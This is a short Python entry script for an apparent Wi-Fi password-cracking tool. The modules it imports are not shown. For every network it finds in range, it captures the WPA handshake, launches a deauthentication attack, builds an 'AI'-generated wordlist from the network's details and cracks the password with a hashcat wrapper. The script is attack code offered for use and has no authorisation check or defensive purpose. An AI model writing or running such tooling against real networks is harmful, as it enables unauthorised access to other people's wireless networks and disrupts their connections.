from network.scanner import scan_networks
from network.handshake import capture_handshake
from network.deauth import deauth_attack
from cracking.wordlist_manager import WordlistManager
from cracking.hashcat_wrapper import crack_password
from ai.feature_extractor import extract_features

def main():
    # Step 1: Scan for networks
    print("[*] Scanning for networks...")
    networks = scan_networks()
    
    if not networks:
        print("[!] No networks found.")
        return

    for network in networks:
        ssid = network["ssid"]
        bssid = network["bssid"]
        channel = network["channel"]
        print(f"[*] Targeting network: {ssid} ({bssid})")

        # Step 2: Capture handshake
        handshake_file = capture_handshake(bssid, channel)

        # Step 3: Perform deauthentication attack
        deauth_attack(bssid)

        # Step 4: Extract network features
        features = extract_features(ssid, bssid)

        # Step 5: Generate wordlist with AI
        wordlist_manager = WordlistManager()
        wordlist = wordlist_manager.generate_wordlist(features)

        # Step 6: Crack password
        crack_password(handshake_file, wordlist)

if __name__ == "__main__":
    main()
